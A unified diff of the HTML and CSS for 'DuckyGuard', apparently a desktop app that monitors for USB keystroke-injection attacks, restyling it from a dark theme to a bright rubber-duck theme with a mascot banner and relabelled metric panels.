@@ -5,9 +5,10 @@
   <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
   <title>DuckyGuard — Physical HID Injection Defense</title>
   <style>
-    /* DuckyGuard · Anti-Slop Engineering Standard
-     * Design System: sh. industries v2.0 (Foreman Standard) + Stripe Radar + Linear + Raycast
-     * Constraints: Zero emojis, zero marketing signage, hairline 1px borders, tabular data, keyboard-first.
+    /* DuckyGuard · Rubber Duck Studio Design System
+     * Tone: Bright, Warm Ivory, Rubber Duck Golden Yellow, Aegis Orange, Crisp White Surfaces
+     * Precision: Stripe Radar + Linear + Raycast + sh. industries Hallmark Standard
+     * Constraints: Tabular numbers, zero layout shift, continuous streaming telemetry.
      */
     @font-face {
       font-family: "Funnel Display";
@@ -41,41 +42,55 @@
     }
 
     :root {
-      /* sh. industries tokens.v2.json Dark System */
-      --bg: #0E0E0D;
-      --surface: #161614;
-      --surface-elevated: #1E1E1B;
-      --surface-subtle: #242420;
-      --line: rgba(255, 255, 255, 0.10);
-      --line-subtle: rgba(255, 255, 255, 0.05);
-      --line-focus: rgba(255, 107, 0, 0.5);
+      /* Bright Rubber Duck Palette */
+      --bg: #FDFBF7;
+      --bg-warm: #FAF5EE;
+      --surface: #FFFFFF;
+      --surface-raised: #FFFFFF;
+      --surface-duck: #FFF8EB;
+      --surface-duck-deep: #FEF3C7;
+      --surface-subtle: #F4EFE6;
 
-      --text: #F2F1EC;
-      --text-muted: #A8A69F;
-      --text-subtle: #686660;
-
-      /* DuckyGuard Product Accent */
-      --accent: #FF6B00;
-      --accent-muted: rgba(255, 107, 0, 0.15);
-
-      /* Semantic Status */
-      --status-ok: #1F9D55;
-      --status-ok-muted: rgba(31, 157, 85, 0.15);
-      --status-warn: #C77800;
-      --status-warn-muted: rgba(199, 120, 0, 0.15);
-      --status-error: #C8322E;
-      --status-error-muted: rgba(200, 50, 46, 0.15);
-      --status-info: #2B6CB0;
-      --status-info-muted: rgba(43, 108, 176, 0.15);
+      /* Hairlines & Borders */
+      --line: #E8E2D5;
+      --line-subtle: #F0ECE4;
+      --line-duck: rgba(245, 158, 11, 0.35);
 
       /* Typography */
-      --fd: "Funnel Display", system-ui, -apple-system, sans-serif;
-      --fs: "Funnel Sans", system-ui, -apple-system, sans-serif;
+      --text: #1C1917;
+      --text-muted: #78716C;
+      --text-subtle: #A8A29E;
+
+      /* Duck Signature Accents */
+      --duck-yellow: #FFB800;
+      --duck-amber: #F59E0B;
+      --duck-orange: #FF6B00;
+      --duck-tint: rgba(255, 184, 0, 0.14);
+      --duck-orange-tint: rgba(255, 107, 0, 0.12);
+
+      /* Semantic Status */
+      --status-ok: #10B981;
+      --status-ok-tint: rgba(16, 185, 129, 0.12);
+      --status-warn: #F59E0B;
+      --status-warn-tint: rgba(245, 158, 11, 0.14);
+      --status-error: #EF4444;
+      --status-error-tint: rgba(239, 68, 68, 0.12);
+      --pond-blue: #0284C7;
+      --pond-tint: rgba(2, 132, 199, 0.10);
+
+      /* Typography Tokens */
+      --fd: "Funnel Display", -apple-system, BlinkMacSystemFont, sans-serif;
+      --fs: "Funnel Sans", -apple-system, BlinkMacSystemFont, sans-serif;
       --fm: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
 
       --r-sm: 6px;
       --r-md: 10px;
       --r-lg: 14px;
+      --r-full: 9999px;
+
+      --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.04);
+      --shadow-md: 0 4px 14px -2px rgba(28, 25, 23, 0.06), 0 1px 3px rgba(0, 0, 0, 0.03);
+      --shadow-duck: 0 6px 20px -3px rgba(245, 158, 11, 0.15);
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -89,18 +104,35 @@
       user-select: none;
     }
 
+    /* Subtle Warm Canvas Texture */
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(circle at 10% 20%, rgba(255, 184, 0, 0.04) 0%, transparent 40%),
+        radial-gradient(circle at 90% 80%, rgba(255, 107, 0, 0.03) 0%, transparent 50%),
+        linear-gradient(to right, rgba(0,0,0,0.02) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(0,0,0,0.02) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 28px 28px, 28px 28px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
     .app-root {
+      position: relative;
+      z-index: 1;
       display: flex;
       flex-direction: column;
       height: 100vh;
-      background: var(--bg);
     }
 
     /* macOS Window Header */
     .app-header {
-      height: 52px;
-      padding: 0 20px 0 84px; /* macOS traffic light clearance */
-      background: var(--surface);
+      height: 56px;
+      padding: 0 20px 0 84px; /* Traffic light clearance */
+      background: rgba(255, 255, 255, 0.88);
+      backdrop-filter: blur(20px);
       border-bottom: 1px solid var(--line);
       display: flex;
       align-items: center;
@@ -109,38 +141,50 @@
       -webkit-app-region: drag;
     }
 
-    .brand-cluster {
+    .brand-section {
       display: flex;
       align-items: center;
       gap: 12px;
       -webkit-app-region: no-drag;
     }
 
-    .brand-mark {
-      width: 28px;
-      height: 28px;
-      border-radius: var(--r-sm);
-      background: var(--surface-elevated);
-      border: 1px solid var(--line);
+    /* Pixel Duck Logo Badge */
+    .duck-mark-frame {
+      width: 36px;
+      height: 36px;
+      border-radius: var(--r-md);
+      background: var(--surface-duck);
+      border: 1px solid var(--duck-amber);
+      box-shadow: 0 2px 8px rgba(245, 158, 11, 0.2);
       display: flex;
       align-items: center;
       justify-content: center;
       overflow: hidden;
+      cursor: pointer;
+      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
     }
-    .brand-mark img {
-      width: 22px;
-      height: 22px;
+    .duck-mark-frame:hover {
+      transform: scale(1.08) rotate(-3deg);
+    }
+    .duck-mark-frame img {
+      width: 30px;
+      height: 30px;
       object-fit: contain;
+      image-rendering: pixelated;
     }
 
-    .brand-info {
+    .brand-titles {
+      display: flex;
+      flex-direction: column;
+    }
+    .brand-row {
       display: flex;
       align-items: baseline;
-      gap: 8px;
+      gap: 7px;
     }
-    .brand-title {
+    .brand-name {
       font-family: var(--fd);
-      font-size: 15px;
+      font-size: 16px;
       font-weight: 800;
       letter-spacing: -0.02em;
       color: var(--text);
@@ -148,53 +192,51 @@
     .brand-kicker {
       font-family: var(--fm);
       font-size: 10px;
-      color: var(--text-muted);
-      letter-spacing: 0.05em;
+      color: var(--duck-amber);
+      font-weight: 700;
+      letter-spacing: 0.08em;
       text-transform: uppercase;
     }
 
-    /* Linear-Style Segmented Navigation */
-    .nav-tabs {
+    /* Segmented Navigation Dock */
+    .nav-dock {
       display: flex;
       align-items: center;
-      background: var(--bg);
+      background: var(--bg-warm);
       border: 1px solid var(--line);
-      border-radius: var(--r-sm);
-      padding: 2px;
+      border-radius: var(--r-full);
+      padding: 3px;
       gap: 2px;
+      box-shadow: var(--shadow-sm);
       -webkit-app-region: no-drag;
     }
-    .nav-tab {
+    .nav-btn {
       appearance: none;
       border: none;
       background: transparent;
       color: var(--text-muted);
       font: 500 12px/1 var(--fs);
-      padding: 6px 12px;
-      border-radius: 4px;
+      padding: 6px 14px;
+      border-radius: var(--r-full);
       cursor: pointer;
       display: flex;
       align-items: center;
       gap: 6px;
-      transition: color 0.15s ease, background 0.15s ease;
+      transition: all 0.15s ease;
     }
-    .nav-tab:hover {
+    .nav-btn:hover {
       color: var(--text);
     }
-    .nav-tab.active {
-      background: var(--surface-elevated);
-      color: var(--text);
+    .nav-btn.active {
+      background: var(--surface);
+      color: var(--duck-orange);
       font-weight: 600;
-      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.4);
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
     }
-    .nav-tab svg {
+    .nav-btn svg {
       width: 14px;
       height: 14px;
-      opacity: 0.75;
-    }
-    .nav-tab.active svg {
-      opacity: 1;
-      color: var(--accent);
+      opacity: 0.85;
     }
 
     /* Header Actions */
@@ -205,64 +247,67 @@
       -webkit-app-region: no-drag;
     }
 
-    .btn-command-search {
+    /* Aegis Ducky Companion Status Pill */
+    .duck-status-pill {
       display: flex;
       align-items: center;
       gap: 8px;
-      background: var(--bg);
-      border: 1px solid var(--line);
-      border-radius: var(--r-sm);
-      padding: 4px 10px;
-      color: var(--text-muted);
-      font: 400 11px/1 var(--fs);
-      cursor: pointer;
-      transition: border-color 0.15s ease, color 0.15s ease;
-    }
-    .btn-command-search:hover {
-      border-color: var(--line-focus);
-      color: var(--text);
-    }
-    .kbd-chip {
-      font-family: var(--fm);
-      font-size: 10px;
-      background: var(--surface-elevated);
-      border: 1px solid var(--line);
-      padding: 1px 4px;
-      border-radius: 3px;
-      color: var(--text-muted);
-    }
-
-    .status-indicator {
-      display: flex;
-      align-items: center;
-      gap: 6px;
+      padding: 5px 12px;
+      border-radius: var(--r-full);
+      background: var(--status-ok-tint);
+      border: 1px solid rgba(16, 185, 129, 0.35);
+      color: var(--status-ok);
       font-family: var(--fm);
       font-size: 11px;
-      font-weight: 600;
-      padding: 4px 10px;
-      border-radius: var(--r-sm);
-      background: var(--status-ok-muted);
-      color: var(--status-ok);
-      border: 1px solid rgba(31, 157, 85, 0.3);
+      font-weight: 700;
       cursor: pointer;
+      transition: all 0.2s ease;
     }
-    .status-indicator.paused {
-      background: var(--status-warn-muted);
-      color: var(--status-warn);
-      border-color: rgba(199, 120, 0, 0.3);
+    .duck-status-pill:hover {
+      box-shadow: 0 2px 10px rgba(16, 185, 129, 0.2);
     }
-    .status-dot {
+    .duck-status-pill.paused {
+      background: var(--status-warn-tint);
+      border-color: rgba(245, 158, 11, 0.4);
+      color: var(--duck-amber);
+    }
+    .pulse-dot {
       width: 6px;
       height: 6px;
       border-radius: 50%;
       background: currentColor;
     }
 
-    /* Main Workspace */
+    .btn-search {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: var(--surface);
+      border: 1px solid var(--line);
+      border-radius: var(--r-sm);
+      padding: 4px 9px;
+      color: var(--text-muted);
+      font: 400 11px/1 var(--fs);
+      cursor: pointer;
+    }
+    .btn-search:hover {
+      border-color: var(--duck-amber);
+      color: var(--text);
+    }
+    .kbd-chip {
+      font-family: var(--fm);
+      font-size: 10px;
+      background: var(--bg-warm);
+      border: 1px solid var(--line);
+      padding: 1px 4px;
+      border-radius: 3px;
+    }
+
+    /* Main Viewport Workspace */
     .app-body {
       flex: 1;
       overflow-y: auto;
-      padding: 24px 28px;
+      padding: 24px 30px;
       display: flex;
       flex-direction: column;
       gap: 20px;
@@ -272,25 +317,32 @@
       display: none;
       flex-direction: column;
       gap: 20px;
+      animation: fadeIn 0.2s ease;
     }
     .tab-view.active {
       display: flex;
     }
 
-    /* Metric Grid (Stripe Radar Architecture) */
+    /* Metric Grid (Fintech / Stripe Precision) */
     .metrics-bar {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
-      gap: 12px;
+      gap: 14px;
     }
     .metric-panel {
       background: var(--surface);
       border: 1px solid var(--line);
       border-radius: var(--r-md);
-      padding: 16px;
+      padding: 16px 18px;
       display: flex;
       flex-direction: column;
       gap: 6px;
+      box-shadow: var(--shadow-sm);
+      transition: all 0.2s ease;
+    }
+    .metric-panel:hover {
+      border-color: var(--duck-amber);
+      box-shadow: var(--shadow-md);
     }
     .metric-header {
       display: flex;
@@ -300,6 +352,7 @@
     .metric-label {
       font-family: var(--fm);
       font-size: 11px;
+      font-weight: 600;
       color: var(--text-muted);
       text-transform: uppercase;
       letter-spacing: 0.05em;
@@ -307,18 +360,19 @@
     .metric-badge {
       font-family: var(--fm);
       font-size: 10px;
-      padding: 2px 6px;
-      border-radius: 4px;
+      font-weight: 600;
+      padding: 2px 7px;
+      border-radius: var(--r-full);
       background: var(--surface-subtle);
       color: var(--text-muted);
     }
     .metric-badge.ok {
-      background: var(--status-ok-muted);
+      background: var(--status-ok-tint);
       color: var(--status-ok);
     }
-    .metric-badge.warn {
-      background: var(--status-warn-muted);
-      color: var(--status-warn);
+    .metric-badge.duck {
+      background: var(--duck-tint);
+      color: var(--duck-amber);
     }
     .metric-number-row {
       display: flex;
@@ -327,7 +381,7 @@
     }
     .metric-number {
       font-family: var(--fd);
-      font-size: 32px;
+      font-size: 34px;
       font-weight: 800;
       letter-spacing: -0.03em;
       color: var(--text);
@@ -348,18 +402,20 @@
       border-top: 1px solid var(--line-subtle);
     }
 
-    /* Engineering Cards & Panels */
+    /* Cards */
     .card {
       background: var(--surface);
       border: 1px solid var(--line);
       border-radius: var(--r-md);
+      box-shadow: var(--shadow-sm);
       overflow: hidden;
       display: flex;
       flex-direction: column;
     }
     .card-header {
-      padding: 14px 18px;
+      padding: 14px 20px;
       border-bottom: 1px solid var(--line);
+      background: var(--surface);
       display: flex;
       align-items: center;
       justify-content: space-between;
@@ -370,22 +426,25 @@
       font-weight: 700;
       letter-spacing: -0.01em;
       color: var(--text);
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
     .card-subheading {
       font-size: 11px;
       color: var(--text-muted);
     }
     .card-body {
-      padding: 16px 18px;
+      padding: 18px 20px;
     }
 
-    /* Real-time Time Series Chart */
+    /* Live Continuous Rolling Chart Container */
     .chart-container {
       position: relative;
       width: 100%;
-      height: 220px;
-      background: var(--bg);
-      border: 1px solid var(--line-subtle);
+      height: 230px;
+      background: #FAF7F0;
+      border: 1px solid var(--line);
       border-radius: var(--r-sm);
       overflow: hidden;
     }
@@ -399,9 +458,140 @@
       font-family: var(--fm);
       font-size: 10px;
       color: var(--text-subtle);
+      pointer-events: none;
     }
 
-    /* Standard Data Tables (SentinelOne / Cloudflare Style) */
+    /* Aegis Ducky Companion Widget */
+    .companion-banner {
+      background: linear-gradient(135deg, var(--surface-duck) 0%, #FFFFFF 100%);
+      border: 1px solid var(--duck-amber);
+      border-radius: var(--r-md);
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: var(--shadow-duck);
+    }
+    .companion-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .companion-avatar {
+      width: 44px;
+      height: 44px;
+      border-radius: var(--r-md);
+      background: #FFFFFF;
+      border: 1px solid var(--duck-amber);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .companion-avatar img {
+      width: 36px;
+      height: 36px;
+      object-fit: contain;
+      image-rendering: pixelated;
+    }
+    .companion-titles {
+      display: flex;
+      flex-direction: column;
+    }
+    .companion-title {
+      font-family: var(--fd);
+      font-size: 14px;
+      font-weight: 800;
+      color: var(--text);
+    }
+    .companion-desc {
+      font-size: 12px;
+      color: var(--text-muted);
+    }
+
+    /* Duck-Themed WPM Counter & Velocity Track */
+    .wpm-hero-card {
+      background: linear-gradient(135deg, var(--surface-duck) 0%, #FFFFFF 60%);
+      border: 1px solid var(--duck-amber);
+      border-radius: var(--r-md);
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      box-shadow: var(--shadow-duck);
+    }
+    .wpm-hero-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .wpm-stat-box {
+      display: flex;
+      align-items: baseline;
+      gap: 10px;
+    }
+    .wpm-big-val {
+      font-family: var(--fd);
+      font-size: 54px;
+      font-weight: 800;
+      letter-spacing: -0.04em;
+      line-height: 1;
+      color: var(--duck-orange);
+      font-variant-numeric: tabular-nums;
+    }
+    .wpm-tier-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: var(--fm);
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 12px;
+      border-radius: var(--r-full);
+      background: #FFFFFF;
+      border: 1px solid var(--duck-amber);
+      color: var(--duck-orange);
+    }
+
+    /* Duck Pond Progress Track */
+    .pond-track {
+      position: relative;
+      width: 100%;
+      height: 28px;
+      background: var(--surface-subtle);
+      border: 1px solid var(--line);
+      border-radius: var(--r-full);
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      padding: 2px;
+    }
+    .pond-water {
+      height: 100%;
+      background: linear-gradient(90deg, #FDE68A 0%, var(--duck-yellow) 100%);
+      border-radius: var(--r-full);
+      width: 0%;
+      transition: width 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    .swimming-duck {
+      position: absolute;
+      top: 2px;
+      left: 0%;
+      width: 24px;
+      height: 24px;
+      transform: translateX(-50%);
+      transition: left 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .swimming-duck img {
+      width: 22px;
+      height: 22px;
+      object-fit: contain;
+      image-rendering: pixelated;
+    }
+
+    /* Tables */
     .data-table-wrap {
       width: 100%;
       overflow-x: auto;
@@ -417,13 +607,13 @@
       font-size: 11px;
       font-weight: 600;
       color: var(--text-muted);
-      padding: 10px 14px;
-      background: var(--surface-elevated);
+      padding: 10px 16px;
+      background: var(--bg-warm);
       border-bottom: 1px solid var(--line);
       letter-spacing: 0.03em;
     }
     .data-table td {
-      padding: 10px 14px;
+      padding: 11px 16px;
       border-bottom: 1px solid var(--line-subtle);
       color: var(--text);
       font-variant-numeric: tabular-nums;
@@ -433,7 +623,7 @@
       transition: background 0.1s ease;
     }
     .data-table tr.clickable:hover {
-      background: var(--surface-elevated);
+      background: var(--surface-duck);
     }
 
     .badge {
@@ -443,33 +633,70 @@
       font-family: var(--fm);
       font-size: 10px;
       font-weight: 600;
-      padding: 2px 6px;
+      padding: 2px 7px;
       border-radius: 4px;
     }
-    .badge.ok { background: var(--status-ok-muted); color: var(--status-ok); }
-    .badge.warn { background: var(--status-warn-muted); color: var(--status-warn); }
-    .badge.error { background: var(--status-error-muted); color: var(--status-error); }
+    .badge.ok { background: var(--status-ok-tint); color: var(--status-ok); }
+    .badge.warn { background: var(--status-warn-tint); color: var(--duck-amber); }
+    .badge.error { background: var(--status-error-tint); color: var(--status-error); }
     .badge.neutral { background: var(--surface-subtle); color: var(--text-muted); }
+    .badge.duck { background: var(--duck-tint); color: var(--duck-orange); font-weight: 700; }
 
-    /* Code & Terminal Blocks */
+    /* Code Blocks */
     .code-block {
-      background: var(--bg);
+      background: #FAF7F0;
       border: 1px solid var(--line);
       border-radius: var(--r-sm);
       padding: 12px 14px;
       font-family: var(--fm);
       font-size: 11px;
       line-height: 1.6;
-      color: #94A3B8;
+      color: #334155;
       overflow-x: auto;
       white-space: pre-wrap;
     }
 
-    /* Slide-out Sheet (GitHub / Stripe Drawer) */
+    /* Buttons */
+    .btn {
+      appearance: none;
+      border: 1px solid var(--line);
+      background: var(--surface);
+      color: var(--text);
+      font: 500 12px/1 var(--fs);
+      padding: 7px 13px;
+      border-radius: var(--r-sm);
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.15s ease;
+      box-shadow: var(--shadow-sm);
+    }
+    .btn:hover {
+      border-color: var(--duck-amber);
+      background: var(--surface-duck);
+    }
+    .btn-duck {
+      background: linear-gradient(135deg, var(--duck-yellow) 0%, var(--duck-orange) 100%);
+      border-color: var(--duck-orange);
+      color: #FFFFFF;
+      font-weight: 700;
+      box-shadow: 0 2px 8px rgba(255, 107, 0, 0.25);
+    }
+    .btn-duck:hover {
+      box-shadow: 0 4px 14px rgba(255, 107, 0, 0.35);
+      transform: translateY(-1px);
+    }
+    .btn-sm {
+      padding: 4px 9px;
+      font-size: 11px;
+    }
+
+    /* Slide-Out Forensic Drawer */
     .drawer-overlay {
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.6);
+      background: rgba(28, 25, 23, 0.35);
       backdrop-filter: blur(4px);
       z-index: 100;
       opacity: 0;
@@ -486,9 +713,9 @@
       right: 0;
       bottom: 0;
       width: 560px;
-      background: var(--surface);
+      background: #FFFFFF;
       border-left: 1px solid var(--line);
-      box-shadow: -8px 0 24px rgba(0, 0, 0, 0.5);
+      box-shadow: -10px 0 30px rgba(0, 0, 0, 0.1);
       z-index: 101;
       display: flex;
       flex-direction: column;
@@ -499,8 +726,9 @@
       transform: translateX(0);
     }
     .drawer-header {
-      padding: 16px 20px;
+      padding: 18px 22px;
       border-bottom: 1px solid var(--line);
+      background: var(--bg-warm);
       display: flex;
       align-items: center;
       justify-content: space-between;
@@ -508,17 +736,17 @@
     .drawer-body {
       flex: 1;
       overflow-y: auto;
-      padding: 20px;
+      padding: 22px;
       display: flex;
       flex-direction: column;
       gap: 16px;
     }
 
-    /* Command Palette Modal (Raycast / Linear Style) */
+    /* Command Palette Modal */
     .command-modal {
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.7);
+      background: rgba(28, 25, 23, 0.45);
       backdrop-filter: blur(6px);
       z-index: 200;
       display: none;
@@ -531,10 +759,10 @@
     }
     .command-box {
       width: 540px;
-      background: var(--surface);
-      border: 1px solid var(--line);
+      background: #FFFFFF;
+      border: 1px solid var(--duck-amber);
       border-radius: var(--r-md);
-      box-shadow: 0 20px 48px rgba(0, 0, 0, 0.6);
+      box-shadow: 0 20px 48px rgba(0, 0, 0, 0.15);
       overflow: hidden;
       display: flex;
       flex-direction: column;
@@ -545,11 +773,7 @@
       gap: 10px;
       padding: 14px 16px;
       border-bottom: 1px solid var(--line);
-    }
-    .command-input-row svg {
-      width: 16px;
-      height: 16px;
-      color: var(--text-muted);
+      background: var(--surface-duck);
     }
     .command-input {
       flex: 1;
@@ -557,7 +781,7 @@
       border: none;
       outline: none;
       color: var(--text);
-      font: 400 13px/1 var(--fs);
+      font: 500 13px/1 var(--fs);
     }
     .command-list {
       max-height: 280px;
@@ -568,7 +792,7 @@
       gap: 2px;
     }
     .command-item {
-      padding: 8px 12px;
+      padding: 9px 12px;
       border-radius: var(--r-sm);
       display: flex;
       align-items: center;
@@ -578,53 +802,11 @@
       cursor: pointer;
     }
     .command-item:hover, .command-item.selected {
-      background: var(--surface-elevated);
-    }
-    .command-item-left {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .command-item-left svg {
-      width: 14px;
-      height: 14px;
-      color: var(--text-muted);
+      background: var(--surface-duck);
+      color: var(--duck-orange);
     }
 
-    /* Interactive Buttons */
-    .btn {
-      appearance: none;
-      border: 1px solid var(--line);
-      background: var(--surface-elevated);
-      color: var(--text);
-      font: 500 12px/1 var(--fs);
-      padding: 7px 12px;
-      border-radius: var(--r-sm);
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      transition: background 0.15s ease, border-color 0.15s ease;
-    }
-    .btn:hover {
-      background: var(--surface-subtle);
-      border-color: var(--line-focus);
-    }
-    .btn-primary {
-      background: var(--accent);
-      border-color: #E66000;
-      color: #FFFFFF;
-      font-weight: 600;
-    }
-    .btn-primary:hover {
-      background: #E66000;
-    }
-    .btn-sm {
-      padding: 4px 8px;
-      font-size: 11px;
-    }
-
-    /* Toast Notification (Sonner Architecture) */
+    /* Toast Container */
     .toast-container {
       position: fixed;
       bottom: 20px;
@@ -636,13 +818,14 @@
       pointer-events: none;
     }
     .toast {
-      background: var(--surface-elevated);
-      border: 1px solid var(--line);
+      background: #FFFFFF;
+      border: 1px solid var(--duck-amber);
       border-radius: var(--r-sm);
       padding: 10px 14px;
       color: var(--text);
       font-size: 12px;
-      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
+      font-weight: 500;
+      box-shadow: 0 4px 16px rgba(245, 158, 11, 0.2);
       display: flex;
       align-items: center;
       gap: 8px;
@@ -651,12 +834,16 @@
     .toast svg {
       width: 14px;
       height: 14px;
-      color: var(--accent);
+      color: var(--duck-orange);
     }
 
     @keyframes toastIn {
       from { transform: translateY(8px); opacity: 0; }
       to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
@@ -665,60 +852,82 @@
 
   <!-- Header -->
   <header class="app-header">
-    <div class="brand-cluster">
-      <div class="brand-mark" title="DuckyGuard Hardware Defense">
-        <img src="/assets/logo.png" alt="DuckyGuard Mark">
+    <div class="brand-section">
+      <div class="duck-mark-frame" title="Aegis Ducky · USB Shield Mascot">
+        <img src="/assets/logo.png" alt="Aegis Ducky">
       </div>
-      <div class="brand-info">
-        <span class="brand-title">DuckyGuard</span>
-        <span class="brand-kicker">Endpoint HID Defense</span>
+      <div class="brand-titles">
+        <div class="brand-row">
+          <span class="brand-name">DuckyGuard</span>
+          <span class="badge duck">USB Shield</span>
+        </div>
+        <span class="brand-kicker">Physical HID Injection Defense</span>
       </div>
     </div>
 
-    <!-- Linear Segmented Tabs -->
-    <nav class="nav-tabs">
-      <button class="nav-tab active" data-tab="monitor">
+    <!-- Segmented Navigation Dock -->
+    <nav class="nav-dock">
+      <button class="nav-btn active" data-tab="monitor">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
         <span>Monitor</span>
       </button>
-      <button class="nav-tab" data-tab="peripherals">
+      <button class="nav-btn" data-tab="peripherals">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="18" r="2"/><path d="M12 16V8"/><path d="M8 8V6a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="9" y1="12" x2="15" y2="12"/></svg>
         <span>Peripherals</span>
       </button>
-      <button class="nav-tab" data-tab="incidents">
+      <button class="nav-btn" data-tab="biometrics">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+        <span>Biometrics & WPM</span>
+      </button>
+      <button class="nav-btn" data-tab="incidents">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
         <span>Incidents</span>
       </button>
-      <button class="nav-tab" data-tab="simulation">
+      <button class="nav-btn" data-tab="simulation">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
         <span>Simulation</span>
-      </button>
-      <button class="nav-tab" data-tab="biometrics">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
-        <span>Biometrics</span>
       </button>
     </nav>
 
     <!-- Header Actions -->
     <div class="header-actions">
-      <button class="btn-command-search" id="btnOpenCommand">
+      <button class="btn-search" id="btnOpenCommand">
         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
         <span>Search</span>
         <span class="kbd-chip">⌘K</span>
       </button>
 
-      <div class="status-indicator" id="defenseToggle" title="Click to toggle protection (Space)">
-        <span class="status-dot"></span>
-        <span id="defenseText">Armed</span>
+      <div class="duck-status-pill" id="defenseToggle" title="Click to toggle protection (Space)">
+        <span class="pulse-dot"></span>
+        <span id="defenseText">Shield Armed</span>
       </div>
     </div>
   </header>
 
-  <!-- Main Viewport -->
+  <!-- Main Viewport Workspace -->
   <main class="app-body">
 
     <!-- 1. MONITOR VIEW -->
     <section class="tab-view active" id="view-monitor">
+      
+      <!-- Aegis Ducky Companion Banner -->
+      <div class="companion-banner">
+        <div class="companion-left">
+          <div class="companion-avatar">
+            <img src="/assets/logo.png" alt="Aegis Ducky Mascot">
+          </div>
+          <div class="companion-titles">
+            <span class="companion-title">Aegis Ducky is Standing Guard</span>
+            <span class="companion-desc">Active hardware-layer USB event tap monitoring for BadUSB injections. Zero rogue keyboards detected.</span>
+          </div>
+        </div>
+        <div style="display:flex; align-items:center; gap:8px;">
+          <span class="badge ok">IOKit EventTap Active</span>
+          <span class="badge duck">Menu Bar Companion Active</span>
+        </div>
+      </div>
+
+      <!-- 4 Metric Panels -->
       <div class="metrics-bar">
         <div class="metric-panel">
           <div class="metric-header">
@@ -730,15 +939,15 @@
             <span class="metric-unit">chars/sec</span>
           </div>
           <div class="metric-footer">
-            <span>Threshold</span>
-            <span style="font-family:var(--fm);">20.0 chars/sec</span>
+            <span>Machine Threshold</span>
+            <span style="font-family:var(--fm);">20.0 CPS</span>
           </div>
         </div>
 
         <div class="metric-panel">
           <div class="metric-header">
-            <span class="metric-label">Timing Variance</span>
-            <span class="metric-badge ok" id="badgeJitter">High Entropy</span>
+            <span class="metric-label">Timing Variance (Jitter)</span>
+            <span class="metric-badge duck" id="badgeJitter">High Entropy</span>
           </div>
           <div class="metric-number-row">
             <span class="metric-number" id="valJitter">0.0</span>
@@ -752,16 +961,16 @@
 
         <div class="metric-panel">
           <div class="metric-header">
-            <span class="metric-label">Monitored USB Ports</span>
-            <span class="metric-badge" id="badgeDevices">IOKit</span>
+            <span class="metric-label">Hardware USB Devices</span>
+            <span class="metric-badge ok" id="badgeDevices">IOKit</span>
           </div>
           <div class="metric-number-row">
             <span class="metric-number" id="valDevices">1</span>
-            <span class="metric-unit">controllers</span>
+            <span class="metric-unit">monitored</span>
           </div>
           <div class="metric-footer">
-            <span>Polling Interval</span>
-            <span style="font-family:var(--fm);">1.0s bus sweep</span>
+            <span>Bus Polling</span>
+            <span style="font-family:var(--fm);">1.0s sweep</span>
           </div>
         </div>
 
@@ -772,42 +981,46 @@
           </div>
           <div class="metric-number-row">
             <span class="metric-number" id="valAttacks">0</span>
-            <span class="metric-unit">quarantined</span>
+            <span class="metric-unit">sunk</span>
           </div>
           <div class="metric-footer">
-            <span>Containment Latency</span>
-            <span style="font-family:var(--fm);">&lt; 100 ms</span>
+            <span>Quarantine Sandbox</span>
